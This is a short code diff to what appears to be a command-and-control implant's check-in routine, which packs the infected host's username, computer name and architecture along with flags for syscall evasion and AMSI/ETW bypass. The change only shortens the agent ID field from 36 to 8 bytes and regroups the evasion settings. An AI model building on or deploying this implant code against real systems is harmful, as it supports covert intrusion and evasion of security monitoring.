@@ -18,7 +18,7 @@ auto DECLFN Transport::Checkin(
     // the pattern checkin requirement
     //
     
-    Self->Pkg->Pad( CheckinPkg, UC_PTR( Self->Session.AgentID ), 36 );
+    Self->Pkg->Pad( CheckinPkg, UC_PTR( Self->Session.AgentID ), 8 );
     Self->Pkg->Byte( CheckinPkg, Self->Machine.OsArch );
     Self->Pkg->Str( CheckinPkg, Self->Machine.UserName );
     Self->Pkg->Str( CheckinPkg, Self->Machine.CompName );
@@ -35,9 +35,9 @@ auto DECLFN Transport::Checkin(
     Self->Pkg->Int32( CheckinPkg, Self->Krnl32.GetOEMCP() );
 
     // some evasion features enable informations
-    Self->Pkg->Int32( CheckinPkg, Self->Config.Syscall );
-    Self->Pkg->Int32( CheckinPkg, Self->Config.BofProxy );
-    Self->Pkg->Int32( CheckinPkg, Self->Config.AmsiEtwBypass );
+    Self->Pkg->Int32( CheckinPkg, Self->Config.Evasion.Syscall );
+    Self->Pkg->Int32( CheckinPkg, Self->Config.Evasion.BofProxy );
+    Self->Pkg->Int32( CheckinPkg, Self->Config.Evasion.AmsiEtwBypass );
 
     // killdate informations
     Self->Pkg->Int32( CheckinPkg, Self->Config.KillDate.Enabled );
@@ -129,8 +129,8 @@ auto DECLFN Transport::Checkin(
     //
     // parse old uuid and new uuid
     //
-    OldUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );
-    NewUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );
+    OldUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 8 );
+    NewUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 8 );
 
     KhDbg( "old uuid: %s", OldUUID );
     KhDbg( "new uuid: %s", NewUUID );
